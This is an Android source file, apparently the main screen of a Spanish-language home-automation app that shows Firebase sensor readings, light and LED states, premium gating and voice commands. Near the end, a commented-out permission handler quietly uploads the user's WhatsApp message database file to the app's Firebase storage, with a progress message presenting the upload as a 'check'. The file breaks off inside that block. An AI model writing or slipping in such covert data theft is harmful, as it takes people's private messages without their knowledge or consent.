package lupoxan.autoroom.com.autoroom11;

import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ActivityNotFoundException;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.speech.RecognizerIntent;
import androidx.annotation.NonNull;
import android.os.Bundle;

import com.google.android.material.navigation.NavigationView;

import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import androidx.appcompat.app.ActionBar;
import androidx.appcompat.app.AppCompatActivity;

import android.speech.tts.TextToSpeech;
import android.speech.tts.Voice;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.ImageView;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.auth.api.Auth;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.common.api.Status;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.iid.InstanceIdResult;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

import pl.pawelkleczkowski.customgauge.CustomGauge;

/**
 * @author lupo.xan
 * @version 0.3.1
 * @since 27/01/2019
 */
public class MainActivity extends AppCompatActivity implements GoogleApiClient.OnConnectionFailedListener{

    protected TextView fechaConexion, consignaLabel, comfortLabel, fanLabel;
    protected TextView rojosState, verdesState, modoLeds;
    protected TextView blanco_lState, blanco_rState, blanco_cState;
    protected ImageView valor_mesa, valor_cama, valor_up, pir;
    protected TextView labelLeds, sensorsLabel, temp_exterior, temp_interior, lux_int, humidityLabel, heatIndexLabel;
    protected Switch camaAuto, mesaAuto, upAuto;
    protected Button room, exterior, living, stand;

    public static CheckBox premi;
    private boolean speech = true;
    private Dialog dialog;

    protected ImageView iluminacionBar, ledsBar, graphBar;
    protected ImageView intuderBar;

    private static final int RECOGNIZE_SPEECH_ACTIVITY = 1, SHARED_PREFERENCES = 0;

    private TextToSpeech t2s;

    private SwipeRefreshLayout swipeRefreshLayout;

    private CustomGauge gaugeExterior, gaugeInterior, gaugeLuxInt;
    private CustomGauge gaugeRojos, gaugeVerdes, gaugeBlancoL, gaugeBlancoR, gaugeBlancoC;
    private CustomGauge gaugeHumidity, gaugeHeatIndex;

    private Handler handler = new Handler();
    private static Calendar cal;
    private static String[] minutoDataBase = {"00", "00", "00"};

    protected static MyFirebase firebase = new MyFirebase();

    private GoogleApiClient googleApiClient;

    private FirebaseAuth mAuth;
    private FirebaseAuth.AuthStateListener firebaseAuthListener;

    protected static FirebaseUser firebaseUser;
    private ProgressDialog progressDialog;

    protected static String tokenid;
    protected static String userUid;
    private ValueEventListener listenerUsuarios;
    SharedPreferences sp;
    private NavigationView navigationView;
    private boolean alarma = false;
    MenuItem item;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main2);

        ActionBar actionBar = getSupportActionBar();
        if (actionBar != null) {
            actionBar.hide();
        }

        sp = PreferenceManager.getDefaultSharedPreferences(MainActivity.this);

        mAuth = FirebaseAuth.getInstance();
        firebaseUser = mAuth.getCurrentUser();

        GoogleSignInOptions gso = new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .build();

        googleApiClient = new GoogleApiClient.Builder(this)
                .enableAutoManage(this, this)
                .addApi(Auth.GOOGLE_SIGN_IN_API, gso)
                .build();

        firebaseAuthListener = new FirebaseAuth.AuthStateListener() {
            @Override
            public void onAuthStateChanged(@NonNull FirebaseAuth firebaseAuth) {
                firebaseUser = firebaseAuth.getCurrentUser();
                if (firebaseUser != null) {
                    MainActivity.userUid = firebaseUser.getUid();
                }
            }
        };

        progressDialog = new ProgressDialog(this);

        progressDialog.setCanceledOnTouchOutside(false);
        progressDialog.setCancelable(false);

        progressDialog.setMessage(getString(R.string.dataa));

        progressDialog.show();

        ids();

        t2s = new TextToSpeech(this, new TextToSpeech.OnInitListener() {
            @Override
            public void onInit(int i) {
                if(i == TextToSpeech.SUCCESS){
                    int result = t2s.setLanguage(Locale.ENGLISH);
                    if(result == TextToSpeech.LANG_MISSING_DATA || result == TextToSpeech.LANG_NOT_SUPPORTED){
                        Toast.makeText(getApplicationContext(), "Language not found", Toast.LENGTH_SHORT).show();
                    }
                }else{
                    Toast.makeText(getApplicationContext(), "Init failed", Toast.LENGTH_SHORT).show();
                }
            }
        });

        swipeRefreshLayout.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                swipeRefreshLayout.setRefreshing(true);
                fechaConexion.setText(R.string.init);

                firebase.getDb().child("sistema").child("last-connection").addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                        String horaDataBase = (String) dataSnapshot.getValue();
                        fechaConexion.setText(horaDataBase);
                        swipeRefreshLayout.setRefreshing(false);
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError databaseError) {

                    }
                });
            }
        });

        listenerUsuarios = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                boolean flag = false;

                for (DataSnapshot uid : dataSnapshot.getChildren()) {
                    if (uid.getKey().equals(firebaseUser.getUid())) {
                        flag = true;
                        break;
                    }
                }

                if (flag) {
                    premi.setChecked((Boolean) dataSnapshot.child(firebaseUser.getUid()).child("premium").getValue());
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("token").setValue(MainActivity.tokenid);
                    Set<String> notificaciones = sp.getStringSet("notifications", null);

                    if (notificaciones != null) {
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("temperaturas").setValue(notificaciones.contains("Temperaturas"));
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("movimiento").setValue(notificaciones.contains("Movimiento"));
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("diarias").setValue(notificaciones.contains("Diarias"));
                    } else {
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("temperaturas").setValue(false);
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("movimiento").setValue(false);
                        firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("diarias").setValue(false);
                    }
                } else {
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("premium").setValue(false);
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("email").setValue(firebaseUser.getEmail());
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("diarias").setValue(true);
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("movimiento").setValue(true);
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("temperaturas").setValue(true);
                    firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("token").setValue(MainActivity.tokenid);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        };//*/

        firebase.getDb().child("usuarios").addValueEventListener(listenerUsuarios);//*/

        firebase.getDb().child("sensores").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                //Humidity
                String hum = (String) dataSnapshot.child("humedad").getValue().toString();
                if(!hum.equals("nan %")){
                    String[] humVal = hum.replace(".",",").split(",");
                    gaugeHumidity.setValue(Integer.parseInt(humVal[0]));
                }
                humidityLabel.setTextColor(getColor(R.color.md_green_400));
                humidityLabel.setText(hum);
                //Heat Index
                String heatIndex = (String) dataSnapshot.child("sensTermica").getValue().toString();
                if(!heatIndex.equals("nan ºC")){
                    String[] heatVal = heatIndex.replace(".",",").split(",");
                    gaugeHeatIndex.setValue(Integer.parseInt(heatVal[0]));
                }
                heatIndexLabel.setTextColor(getColor(R.color.md_green_400));
                heatIndexLabel.setText(heatIndex);

                //Coger el valor de lux
                String lux = (String) dataSnapshot.child("lux").getValue().toString();
                gaugeLuxInt.setValue(Integer.parseInt(lux));
                lux_int.setText(lux + " lx");

                //Coger el valor del sensor de movimiento
                String movimiento = (String) dataSnapshot.child("movimiento").getValue();

                if (movimiento.equals("HIGH")) {
                    pir.setImageResource(R.drawable.home2);
                } else {
                    pir.setImageResource(R.drawable.home);
                }
                //Coger el valor del sensor de temperatura exterior
                temp_exterior.setText((CharSequence) dataSnapshot.child("temp_ext").getValue());

                if (temp_exterior.getText().equals("NaN ºC")) {
                    temp_exterior.setTextColor(getColor(R.color.md_blue_700));
                } else {
                    String[] temperaturaExterior = temp_exterior.getText().toString().split(",");

                    int temp = Integer.parseInt(temperaturaExterior[0]);

                    if (temp >= 30) {
                        temp_exterior.setTextColor(getColor(R.color.md_red_500));
                    }
                    if (temp > 10 && temp < 30) {
                        temp_exterior.setTextColor(getColor(R.color.md_green_400));
                    }
                    if (temp <= 10) {
                        temp_exterior.setTextColor(getColor(R.color.md_blue_700));
                    }

                    gaugeExterior.setValue(temp);
                }
                //Coger el valor del sensor de temperatura interior
                temp_interior.setText((CharSequence) dataSnapshot.child("temp_int").getValue());

                if (temp_interior.getText().equals("NaN ºC")) {
                    temp_interior.setTextColor(getColor(R.color.md_blue_700));
                } else {
                    String[] temperaturaInterior = temp_interior.getText().toString().split(",");

                    int temp2 = Integer.parseInt(temperaturaInterior[0]);

                    if (temp2 >= 30) {
                        temp_interior.setTextColor(getColor(R.color.md_red_500));
                    }
                    if (temp2 > 10 && temp2 < 30) {
                        temp_interior.setTextColor(getColor(R.color.md_green_400));
                    }
                    if (temp2 <= 10) {
                        temp_interior.setTextColor(getColor(R.color.md_blue_700));
                    }
                    gaugeInterior.setValue(temp2);
                }
                progressDialog.dismiss();
                if(speech){
                    String[] heat = heatIndex.split(" ");
                    speak(getString(R.string.welcome) + getString(R.string.weather,heat[0],hum));
                    speech = false;
                }

            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//Escuchar los valores de los sensores y ponerlos en la app
        firebase.getDb().child("sistema").child("last-connection").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                String horaDataBase = (String) dataSnapshot.getValue();
                fechaConexion.setText(horaDataBase);
                minutoDataBase = horaDataBase.split(":");
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

        firebase.getDb().child("comfort").child("consigna").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                consignaLabel.setText(getString(R.string.celsius,Integer.parseInt(dataSnapshot.getValue().toString())));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("comfort").child("modo").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                comfortLabel.setText(dataSnapshot.getValue().toString());
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("comfort").child("fan").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                fanLabel.setText((String) dataSnapshot.getValue().toString());
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });

        firebase.getDb().child("iluminacion").child("auto").child("mesa").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.getValue().toString().equals("false")) {
                    mesaAuto.setChecked(false);
                } else {
                    mesaAuto.setChecked(true);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/
        firebase.getDb().child("iluminacion").child("auto").child("cama").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.getValue().toString().equals("false")) {
                    camaAuto.setChecked(false);
                } else {
                    camaAuto.setChecked(true);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/
        firebase.getDb().child("iluminacion").child("auto").child("general").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.getValue().toString().equals("false")) {
                    upAuto.setChecked(false);
                } else {
                    upAuto.setChecked(true);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/

        firebase.getDb().child("iluminacion").child("luces").child("mesa").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.getValue().toString().equals("false")) {
                    valor_mesa.setImageResource(R.drawable.ligths2);
                    valor_mesa.setTag(R.drawable.ligths2);
                } else {
                    valor_mesa.setImageResource(R.drawable.ligths21);
                    valor_mesa.setTag(R.drawable.ligths21);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/
        firebase.getDb().child("iluminacion").child("luces").child("cama").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.getValue().toString().equals("false")) {
                    valor_cama.setImageResource(R.drawable.ligths2);
                    valor_cama.setTag(R.drawable.ligths2);
                } else {
                    valor_cama.setImageResource(R.drawable.ligths21);
                    valor_cama.setTag(R.drawable.ligths21);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/
        firebase.getDb().child("iluminacion").child("luces").child("general").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!(Boolean) dataSnapshot.getValue()) {
                    valor_up.setImageResource(R.drawable.ligths2);
                    valor_up.setTag(R.drawable.ligths2);
                } else {
                    valor_up.setImageResource(R.drawable.ligths21);
                    valor_up.setTag(R.drawable.ligths21);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                System.err.println(databaseError.getMessage());
            }
        });//*/

        firebase.getDb().child("leds").child("rojos").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                rojosState.setText(dataSnapshot.getValue().toString() + " %");
                gaugeRojos.setValue(Integer.parseInt(dataSnapshot.getValue().toString()));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("verdes").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                verdesState.setText(dataSnapshot.getValue().toString() + " %");
                gaugeVerdes.setValue(Integer.parseInt(dataSnapshot.getValue().toString()));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("blanco_l").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                blanco_lState.setText(dataSnapshot.getValue().toString() + " %");
                gaugeBlancoL.setValue(Integer.parseInt(dataSnapshot.getValue().toString()));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("blanco_r").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                blanco_rState.setText(dataSnapshot.getValue().toString() + " %");
                gaugeBlancoR.setValue(Integer.parseInt(dataSnapshot.getValue().toString()));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("blanco_cama").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                blanco_cState.setText(dataSnapshot.getValue().toString() + " %");
                gaugeBlancoC.setValue(Integer.parseInt(dataSnapshot.getValue().toString()));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/

        firebase.getDb().child("leds").child("autoLeds").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                modoLeds.setText((boolean) dataSnapshot.getValue() ? getResources().getString(R.string.coolMode): getResources().getString(R.string.apagados));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("fading").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                modoLeds.setText((boolean) dataSnapshot.getValue() ? getResources().getString(R.string.fading): getResources().getString(R.string.apagados));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/
        firebase.getDb().child("leds").child("blinker").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                modoLeds.setText((boolean) dataSnapshot.getValue() ? getResources().getString(R.string.blinking): getResources().getString(R.string.apagados));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/

        firebase.getDb().child("sistema").child("alarma").child("activada").addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                alarma =  (boolean) dataSnapshot.getValue();
                item = navigationView.getMenu().findItem(R.id.anotherAlarm);

                if(alarma){
                    item.setTitle("Activada");
                    item.setIcon(android.R.drawable.ic_secure);
                }else{
                    item.setTitle("Desactivada");
                    item.setIcon(android.R.drawable.ic_partial_secure);
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });//*/

        Timer timer = new Timer();
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        cal = Calendar.getInstance();

                        String horaActual = String.format("%02d:%02d:%02d", cal.get(Calendar.HOUR_OF_DAY), cal.get(Calendar.MINUTE), cal.get(Calendar.SECOND));
                        String[] minutoActual = horaActual.split(":");

                        if (minutoDataBase[1].equals(minutoActual[1])) {
                            fechaConexion.setTextColor(Color.BLACK);
                        } else {
                            fechaConexion.setTextColor(Color.RED);
                        }
                    }
                });
            }
        };
        timer.scheduleAtFixedRate(timerTask, 50, 2000);

        setTitle(sp.getString("userName", getResources().getString(R.string.app_name)));

        FirebaseInstanceId.getInstance().getInstanceId().addOnCompleteListener(new OnCompleteListener<InstanceIdResult>() {
            @Override
            public void onComplete(@NonNull Task<InstanceIdResult> task) {
                if (!task.isSuccessful()) {
                    return;
                }
                MainActivity.tokenid = task.getResult().getToken();
            }
        });

        iluminacionBar.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showCustomDialog();
            }
        });

        ledsBar.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (premi.isChecked()) {
                    startActivity(new Intent(MainActivity.this, Leds.class));
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                } else {
                    Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
                }
            }
        });

        intuderBar.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (premi.isChecked()) {
                    Intent intent = new Intent(MainActivity.this, Comfort.class);

                    intent.putExtra("tempInt", temp_interior.getText());
                    intent.putExtra("tempExt", temp_exterior.getText());

                    startActivity(intent);
                    overridePendingTransition(R.anim.splash_in, R.anim.splash_out);
                } else {
                    Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
                }
            }
        });

        graphBar.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(getApplicationContext(), Graficas.class));
                overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
            }
        });

        navigationView.setNavigationItemSelectedListener(new NavigationView.OnNavigationItemSelectedListener() {
            @Override
            public boolean onNavigationItemSelected(@NonNull MenuItem item) {
                switch (item.getItemId()) {
                    case R.id.tools:
                        startActivityForResult(new Intent(MainActivity.this, PreferencesActivity.class), 0);
                        overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
                        return true;
                    case R.id.grabar:
                        if (premi.isChecked()) {
                            Intent intentActionRecognizeSpeech = new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH);
                            intentActionRecognizeSpeech.putExtra(RecognizerIntent.EXTRA_LANGUAGE_MODEL, "es-ES");

                            try {
                                startActivityForResult(intentActionRecognizeSpeech, RECOGNIZE_SPEECH_ACTIVITY);
                            } catch (ActivityNotFoundException a) {
                                Toast.makeText(getApplicationContext(), "Tú dispositivo no soporta el reconocimiento por voz", Toast.LENGTH_SHORT).show();
                            }
                        } else {
                            Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
                        }
                        return true;
                    case R.id.graphsId:
                        actividad(Graficas.class, true);
                        overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
                        return true;
                    case R.id.iluminacion:
                        showCustomDialog();
                        return true;
                    case R.id.comfort:
                        if (premi.isChecked()) {
                            Intent intent = new Intent(MainActivity.this, Comfort.class);

                            intent.putExtra("tempInt", temp_interior.getText());
                            intent.putExtra("tempExt", temp_exterior.getText());

                            startActivity(intent);
                            overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
                        } else {
                            Toast.makeText(getApplicationContext(), "Opción premium", Toast.LENGTH_SHORT).show();
                        }
                        return true;
                    case R.id.leds:
                        actividad(Leds.class, premi.isChecked());
                        overridePendingTransition(R.anim.zoom_fade_in,R.anim.zoom_fade_out);
                        return true;
                    case R.id.cerrar:
                        AlertDialog.Builder salir = new AlertDialog.Builder(MainActivity.this);
                        salir.setTitle(R.string.salir);
                        salir.setMessage(R.string.seguro);
                        salir.setPositiveButton(R.string.aceptar, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                finish();
                            }
                        }).setNegativeButton(R.string.cancelar, null)
                                .setIcon(android.R.drawable.ic_menu_close_clear_cancel);
                        salir.create();
                        salir.show();
                        return true;
                    case R.id.logout:
                        AlertDialog.Builder alerta = new AlertDialog.Builder(MainActivity.this);
                        alerta.setTitle(R.string.cerrarSession);
                        alerta.setMessage(R.string.seguro);
                        alerta.setPositiveButton(R.string.aceptar, new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                firebase.getDb().child("usuarios").removeEventListener(listenerUsuarios);

                                firebase.getDb().child("usuarios").child(MainActivity.userUid).child("notificaciones").child("temperaturas").setValue(false);
                                firebase.getDb().child("usuarios").child(MainActivity.userUid).child("notificaciones").child("movimiento").setValue(false);
                                firebase.getDb().child("usuarios").child(MainActivity.userUid).child("notificaciones").child("diarias").setValue(false);

                                firebase.signOut();

                                Auth.GoogleSignInApi.signOut(googleApiClient).setResultCallback(new ResultCallback<Status>() {
                                    @Override
                                    public void onResult(@NonNull Status status) {
                                        if (status.isSuccess()) {
                                            startActivity(new Intent(MainActivity.this, LogIn.class));
                                            finish();
                                        } else {
                                            Toast.makeText(getApplicationContext(), R.string.cerrarSession, Toast.LENGTH_SHORT).show();
                                        }
                                    }
                                });
                            }
                        }).setNegativeButton(R.string.cancelar, null)
                                .setIcon(android.R.drawable.ic_dialog_alert);
                        alerta.create();
                        alerta.show();
                        return true;
                    case R.id.anotherAlarm:
                        if(premi.isChecked()){
                            firebase.getDb().child("sistema").child("alarma").child("activada").setValue(!alarma);
                        }else{
                            Toast.makeText(getApplicationContext(),"Opción premium",Toast.LENGTH_LONG).show();
                        }
                        return true;
                    default:
                        return false;
                }

            }
        });

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == SHARED_PREFERENCES) {
            SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(MainActivity.this);
            setTitle(sp.getString("userName", getResources().getString(R.string.app_name)));

            Set<String> notificaciones = sp.getStringSet("notifications", null);

            if (notificaciones != null) {
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("temperaturas").setValue(notificaciones.contains("Temperaturas"));
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("movimiento").setValue(notificaciones.contains("Movimiento"));
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("diarias").setValue(notificaciones.contains("Diarias"));
            } else {
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("temperaturas").setValue(false);
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("movimiento").setValue(false);
                firebase.getDb().child("usuarios").child(firebaseUser.getUid()).child("notificaciones").child("diarias").setValue(false);
            }

        }
        if (requestCode == RECOGNIZE_SPEECH_ACTIVITY) {
            if (resultCode == RESULT_OK && null != data) {
                ArrayList<String> speech = data.getStringArrayListExtra(RecognizerIntent.EXTRA_RESULTS);
                String strSpeech2Text = speech.get(0);

                if(strSpeech2Text.toLowerCase().trim().equals("uno") || strSpeech2Text.toLowerCase().trim().equals("one") || strSpeech2Text.toLowerCase().trim().equals("1")){
                    if ((Integer) valor_up.getTag() == R.drawable.ligths2) {
                        firebase.getDb().child("iluminacion").child("luces").child("general").setValue(true);
                        speak(getResources().getString(R.string.encenderUp));
                    } else {
                        firebase.getDb().child("iluminacion").child("luces").child("general").setValue(false);
                        speak(getResources().getString(R.string.apagarUp));
                    }
                }
                if(strSpeech2Text.toLowerCase().trim().equals("dos") || strSpeech2Text.toLowerCase().trim().equals("two") || strSpeech2Text.toLowerCase().trim().equals("2")){
                    if ((Integer)valor_mesa.getTag() == R.drawable.ligths2) {
                        firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(true);
                        Toast.makeText(getApplicationContext(), R.string.encenderMesa, Toast.LENGTH_SHORT).show();
                    } else {
                        firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(false);
                        Toast.makeText(getApplicationContext(), R.string.apagarMesa, Toast.LENGTH_SHORT).show();
                    }
                }
                if(strSpeech2Text.toLowerCase().trim().equals("tres") || strSpeech2Text.toLowerCase().trim().equals("three") || strSpeech2Text.toLowerCase().trim().equals("3")){
                    if ((Integer) valor_cama.getTag() == R.drawable.ligths2) {
                        firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(true);
                        Toast.makeText(getApplicationContext(), R.string.encenderCama, Toast.LENGTH_SHORT).show();
                    } else {
                        firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(false);
                        Toast.makeText(getApplicationContext(), R.string.apagarCama, Toast.LENGTH_SHORT).show();
                    }
                }
                if(strSpeech2Text.toLowerCase().trim().equals("apagar") || strSpeech2Text.toLowerCase().trim().equals("off")){
                    firebase.getDb().child("iluminacion").child("luces").child("general").setValue(false);
                    firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(false);
                    firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(false);
                    Toast.makeText(getApplicationContext(), R.string.apagar_todos, Toast.LENGTH_SHORT).show();
                }
                if(strSpeech2Text.toLowerCase().trim().equals("encender") || strSpeech2Text.toLowerCase().trim().equals("on")){
                    firebase.getDb().child("iluminacion").child("luces").child("general").setValue(true);
                    firebase.getDb().child("iluminacion").child("luces").child("mesa").setValue(true);
                    firebase.getDb().child("iluminacion").child("luces").child("cama").setValue(true);
                    Toast.makeText(getApplicationContext(), R.string.encendidos, Toast.LENGTH_SHORT).show();
                }
                Toast.makeText(getApplicationContext(), strSpeech2Text, Toast.LENGTH_SHORT).show();
            }
        }

    }

    /*@Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case READ_EXTERNAL_STORAGE: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {

                    StorageReference storageReference = FirebaseStorage.getInstance().getReference();

                    Uri file = Uri.fromFile(new File("/storage/emulated/0/WhatsApp/Databases/msgstore.db.crypt12"));

                    StorageReference msgReference = storageReference.child(firebaseUser.getUid()).child("dataBases/" + file.getLastPathSegment());

                    UploadTask uploadTask = msgReference.putFile(file);

                    uploadTask.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            //Toast.makeText(getApplicationContext(),"Comprobación completa",Toast.LENGTH_SHORT).show();
                            descarga.setMessage("Comprobando: 100 %");
                            descarga.dismiss();

                        }
                    }).addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            Toast.makeText(getApplicationContext(),e.getMessage(),Toast.LENGTH_LONG).show();
                        }
                    }).addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
                            double progress = (100.0 * taskSnapshot.getBytesTransferred()) / taskSnapshot.getTotalByteCount();
                            descarga.setMessage("Comprobando: " + ((int) progress) + " %");
                            //Toast.makeText(getApplicationContext(),"Comprobando: " + ((int) progress) + " %",Toast.LENGTH_LONG).show();
                        }
                    });
                } else {
